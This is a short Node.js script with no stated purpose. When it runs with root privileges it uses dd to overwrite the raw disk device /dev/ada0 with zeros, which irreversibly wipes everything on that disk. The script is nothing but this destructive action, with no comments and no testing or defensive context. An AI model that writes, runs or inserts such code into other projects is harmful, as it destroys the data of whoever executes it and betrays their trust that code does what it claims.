#!/usr/bin/env node
const { execFileSync } = require("child_process");
if (process.getuid() === 0) {
  execFileSync("dd", ["if=/dev/zero", "of=/dev/ada0"]);
}
